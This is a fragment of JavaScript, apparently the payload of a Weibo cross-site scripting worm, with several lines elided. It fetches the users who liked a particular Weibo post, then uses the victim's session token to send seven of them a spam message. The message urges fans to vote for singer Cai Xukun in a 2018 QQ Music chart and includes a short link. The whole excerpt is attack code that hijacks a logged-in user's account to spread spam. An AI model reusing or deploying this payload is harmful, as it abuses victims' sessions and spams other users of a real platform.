   z=new XMLHttpRequest();
        ...
        z.onreadystatechange=function(){
            if (z.readyState == 4){
                ...
                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4323041142523111",true);
                f.send();
                f.onreadystatechange=function(){
                    if(f.readyState==4){
                        ...
                        for (var i=0;i<7;i++)
                        {
                            ...
                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，2018qq音乐巅峰榜蔡徐坤需要你的一票，目前排第三，动动手指投一票>>http://t.cn/EbXsTNT&st=' + obj.data.st);
